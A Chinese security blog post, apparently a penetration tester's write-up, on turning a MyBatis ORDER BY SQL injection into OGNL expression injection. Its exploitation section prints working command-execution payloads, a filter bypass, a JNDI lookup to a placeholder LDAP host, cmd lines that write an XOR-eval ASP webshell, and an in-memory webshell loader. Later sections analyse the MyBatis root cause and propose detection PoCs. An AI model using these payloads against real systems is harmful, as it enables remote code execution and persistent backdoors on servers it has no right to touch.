@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x1 前言前段时间，一位同事跑来问我，说用Xray扫出来了一个SQL注入漏洞可以执行表达式，但是漏洞没能利用成功。我听了一愣，SQL注入漏洞执行表达式？同事把Xray的扫描截图发给我，orderBy参数的${911580744+963045104}确实执行了，响应数据包的报错信息里面返回了上述表达式的结果。我看了之后瞬间反应过来了，这不就是Mybatis的OGNL表达式执行么，之前在D3CTF有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入">
+<meta property="og:url" content="http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="长夏">
+<meta property="og:description" content="0x1 前言前段时间，一位同事跑来问我，说用Xray扫出来了一个SQL注入漏洞可以执行表达式，但是漏洞没能利用成功。我听了一愣，SQL注入漏洞执行表达式？同事把Xray的扫描截图发给我，orderBy参数的${911580744+963045104}确实执行了，响应数据包的报错信息里面返回了上述表达式的结果。我看了之后瞬间反应过来了，这不就是Mybatis的OGNL表达式执行么，之前在D3CTF有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/1.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/2.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/3.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/4.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/5.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/6.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/7.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/8.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/9.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/10.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/11.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/12.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/13.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/14.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/15.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/16.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/17.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/18.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/19.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/20.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/21.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/22.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/23.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/24.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/25.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/26.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/27.png">
+<meta property="article:published_time" content="2024-01-09T00:05:33.000Z">
+<meta property="article:modified_time" content="2024-01-13T03:22:02.799Z">
+<meta property="article:author" content="长夏">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="OGNL表达式注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="长夏" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2022/05/09/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%BA%94%EF%BC%88%E5%AF%B9%E6%8A%97%E7%AF%87%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&text=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&is_video=false&description=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入&body=Check out this article: http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&name=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&t=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-前言"><span class="toc-number">1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">0x2 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-漏洞原理"><span class="toc-number">3.</span> <span class="toc-text">0x3 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-思考"><span class="toc-number">4.</span> <span class="toc-text">0x4 思考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">长夏</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-09T00:05:33.000Z" itemprop="datePublished">2024-01-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="tag">OGNL表达式注入</a>, <a class="tag-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>前段时间，一位同事跑来问我，说用Xray扫出来了一个SQL注入漏洞可以执行表达式，但是漏洞没能利用成功。我听了一愣，SQL注入漏洞执行表达式？同事把Xray的扫描截图发给我，orderBy参数的${911580744+963045104}确实执行了，响应数据包的报错信息里面返回了上述表达式的结果。我看了之后瞬间反应过来了，这不就是Mybatis的OGNL表达式执行么，之前在D3CTF有看过一样的漏洞，没想到在实战环境中居然还真的能遇到。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/1.png" alt=""></p>
+<h2 id="0x2-漏洞利用"><a href="#0x2-漏洞利用" class="headerlink" title="0x2 漏洞利用"></a>0x2 漏洞利用</h2><p>先构造简单的命令执行OGNL表达式，很明显没成功，细看了一下响应数据包的报错信息，发现了端倪，原来是后端代码对用户的输入做了安全处理将Runtime转成了_runtime。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;)&#125;   #原始输入</span><br><span class="line">$&#123;@java.lang._runtime@get_runtime().exec(&quot;whoami&quot;)&#125;  #安全处理</span><br></pre></td></tr></table></figure>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/2.png" alt=""></p>
+<p>一开始以为是将一些危险的函数之类的做了黑名单的处理，进一步测试发现是将用户输入的所有大写字母都做了处理，不知道开发人员是怎么想的呢？让人摸不着头脑。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/3.png" alt=""></p>
+<p>经过不懈的努力之后发现直接用unicode编码payload的大写字母就可以绕过了，如下，无回显执行命令成功。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/4.png" alt=""></p>
+<p>当然，在不考虑实际漏洞利用环境限制的前提下，还有很多可以执行命令的方式。例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;new javax.naming.InitialContext().lookup(&quot;ldap:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;a&quot;)&#125;  #JNDI注入利用，需要出网条件</span><br><span class="line"></span><br><span class="line">$&#123;@jdk.jshell.Jshell@create().eval(&#39;java_code&#39;)&#125;  #需要JDK9以后版本</span><br></pre></td></tr></table></figure>
+<p>构造回显payload，成功执行whoami命令，得知服务器操作系统为Windows，用户权限为管理员权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#a&#x3D;(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(&#123;&#39;whoami&#39;&#125;).start().getInputStream()))).readLine()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/5.png" alt=""><br>上面的payload只能读取单行结果，也可以使用其他的回显方法可以读取多行结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;new String(@org.springframework.util.StreamUtils@copyToByteArray(@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;).getInputStream()))&#125;</span><br><span class="line"></span><br><span class="line">$&#123;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/6.png" alt=""></p>
+<p>经过探测发现服务器不通外网，所以还是得通过写webshell的方式来进一步获取权限，但是SpringBoot应用基本不大可能能写webshell到应用目录进行访问。刚巧发现服务器上还运行了IIS服务，直接访问URL的一级目录就出来一个报错信息了，真是山重水复疑无路，柳暗花明又一村。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/7.png" alt=""></p>
+<p>那就直接往IIS的Web应用目录写入webshell就好了，因为只支持GET请求，URL有长度限制，因此需要通过追加文件的方式分段写入，可以一行一行写，也可以通过写入base64编码的webshell减少追加写入的次数，然后用certutil解码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c echo ^&lt;% &gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo Response.CharSet &#x3D; &quot;UTF-8&quot; &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo k&#x3D;&quot;e45e329feb5d925b&quot; &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo Session(&quot;k&quot;)&#x3D;k &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo size&#x3D;Request.TotalBytes &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo content&#x3D;Request.BinaryRead(size) &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo For i&#x3D;1 To size &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo result&#x3D;result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))) &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo Next &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo execute(result) &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br><span class="line">cmd &#x2F;c echo %^&gt; &gt;&gt; D:\\release\\***\\***\\test1.asp</span><br></pre></td></tr></table></figure>
+
+<p>成功写入webshell。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/8.png" alt=""></p>
+<p>但是webshell写入几秒后就被删了，服务器安装了终端防护软件，既有360安全卫士，又有奇安信天擎。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/9.png" alt=""></p>
+<p>遇到这种情况能想到的解决办法基本上只能写免杀webshell了，要不就直接注入内存webshell，不过因为不是攻防项目，当时就没有继续折腾。最近突然想起这个漏洞，决定本地搭建模拟环境继续折腾一下。</p>
+<p>正常情况下，通过下面的方法就可以成功写入内存webshell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@org.springframework.cglib.core.ReflectUtils@defineClass(&#39;xxxx&#39;, @org.springframework.util.Base64Utils@decodeFromString(&#39;yv66v...&#39;), new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/10.png" alt=""></p>
+<p>但当时面临的实际情况是只支持GET请求，因为URL是有长度限制的，所以直接使用上面的方法也是不可行的，因为没法分段，只能一次性发送请求。最后的解决方法就是再绕一下，先把字节码的base64编码字符串先分段写入服务器文件，然后再去读取从而缩减payload的长度。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@org.springframework.cglib.core.ReflectUtils@defineClass(&#39;xxxx&#39;, @org.springframework.util.Base64Utils@decodeFromString(new String(@org.springframework.util.StreamUtils@copyToByteArray(@java.lang.Runtime@getRuntime().exec(&quot;cat &#x2F;tmp&#x2F;a&quot;).getInputStream())).replace(&quot;\n&quot;,&quot;&quot;)), new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/11.png" alt=""></p>
+<h2 id="0x3-漏洞原理"><a href="#0x3-漏洞原理" class="headerlink" title="0x3 漏洞原理"></a>0x3 漏洞原理</h2><p>Mybatis3是支持动态SQL的，根据动态SQL的描述得知是支持使用OGNL表达式的。其中Mybatis的if、choose、when、otherwise、trim、where、set、foreach等元素都支持动态SQL。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/12.png" alt=""></p>
+<p>除此之外，使用@Provider注解也是支持动态SQL的。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/13.png" alt=""></p>
+<p>具体的漏洞示例代码如下，使用了@SelectProvider注解。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/14.png" alt=""></p>
+<p>并且SQL查询语句拼接了用户可控的参数，即存在SQL注入漏洞。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/15.png" alt=""></p>
+<p>下断点动态调试Mybatis关键的处理过程，跳过前面Mybatis复杂的代理模块部分，来到ProviderSqlSource类，该类实现了SqlSource接口，用于处理@Provider注解的SQL。<br>org.apache.ibatis.builder.annotation.ProviderSqlSource$createSqlSource<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/16.png" alt=""></p>
+<p>继续跟进发现是通过XMLLanguageDriver类的createSqlSource方法实现动/静态的SQL的判断，如果是是动态SQL则进入DynamicSqlSource类处理，否则进入RawSqlSource类处理。<br>org.apache.ibatis.scripting.xmltags.XMLLanguageDriver$createSqlSource<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/17.png" alt=""></p>
+<p>跟进动/静态SQL的判断逻辑，PropertyParser类的parser方法实际调用了GenericTokenParser类的parse方法对SQL语句进行解析。<br>org.apache.ibatis.parsing.PropertyParser$parse<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/18.png" alt=""></p>
+<p>GenericTokenParser为通用标记解析器，用于解析SQL语句中的#{}和${}占位符参数，这里的解析会去除了占位符前半部分的转义符号，如输入\${1<em>999}会被解析成${1</em>999}。而最终的处理则是由指定的标记处理器TokenHandler完成。<br>org.apache.ibatis.parsing.GenericTokenParser$parser<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/19.png" alt=""></p>
+<p>继续回到XMLLanguageDriver类的createSqlSource方法，最终通过TextSqlNode类的isDynamic方法判断是否为动态SQL，判断依据为SQL语句中是否包含${}。<br>org.apache.ibatis.scripting.xmltags.TextSqlNode$isDynamic<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/20.png" alt=""></p>
+<p>接着进入ProviderSqlSource类的getBoundSql方法，返回BoundSql对象。<br>org.apache.ibatis.builder.annotation.ProviderSqlSource$getBoundSql<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/21.png" alt=""></p>
+<p>进入DynamicSqlSource的getBoundSql方法，继续跟进TextSqlNode的apply方法。<br>org.apache.ibatis.scripting.xmltags.DynamicSqlSource$getBound<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/22.png" alt=""></p>
+<p>org.apache.ibatis.scripting.xmltags.TextSqlNode$apply<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/23.png" alt=""></p>
+<p>再次进入通用标记解析器，使用TextSqlNode$BindingTokenParser对表达式进行处理。<br>org.apache.ibatis.parsing.GenericTokenParser$parse<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/24.png" alt=""></p>
+<p>最后，在handleToken中调用OgnlCache.getValue对OGNL表达式进行解析。<br>org.apache.ibatis.scripting.xmltags.TextSqlNode.BindingTokenParser$handleToken<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/25.png" alt=""></p>
+<h2 id="0x4-思考"><a href="#0x4-思考" class="headerlink" title="0x4 思考"></a>0x4 思考</h2><p>在平常渗透测试的时候，我知道在order by排序参数这里出现SQL注入的可能性会比较高，在测试中也会优先去找排序功能测试是否存在SQL注入漏洞。因为order by无法使用预编译的方式进行安全处理，一些安全意识不高的开发人员可能会倾向于做一些黑名单处理或者干脆就使用拼接的方式不做任何处理。当然安全处理方式肯定是做白名单检验，排序的字段基本都是固定的，一般也不多，因此不需要考虑用户其他太多的输入情况。</p>
+<p>反思自己在之前的人工渗透测试中，其实对这种表达式注入的漏洞关注度是很低的，除非是一些已知历史漏洞存在相关的关联性才会想着往表达式注入这一块去测试，比如一些已知的框架或者通用应用之类的。如果不借助自动化测试工具的话，按照自己以往的测试习惯的话，这个OGNL表达式漏洞必然是会被我忽略的。由此想到，这个世界总会存在一些我们认知之外的事物，经验会让一个人变得丰富，但同时也可能会让我们忽略一些偶然的事物。</p>
+<p>没有进一步研究Xray针对表达式注入的其他检测Poc，不知是否有考虑到无回显场景的检测呢？单看目前这个检测的Poc的话，如果响应数据包是没有回显的话，必然也是会存在漏报的。考虑无回显场景的检测的话目前能想到检测方案有两个：一是通过时间延迟检测；二是构造回显检测。综合来说。时间延迟检测会是一个比较稳妥的方案，Poc比较简单，通用型比较强，也不需要考虑其他的依赖。</p>
+<p>时间延迟检测Poc示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Thread@currentThread().sleep(9000L)&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/26.png" alt=""></p>
+<p>构造回显检测Poc示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@org.springframework.web.context.request.RequestContextHolder@currentRequestAttributes().getResponse().setHeader(&quot;X-Check&quot;,&#39;vulnerable&#39;)&#125;</span><br></pre></td></tr></table></figure>
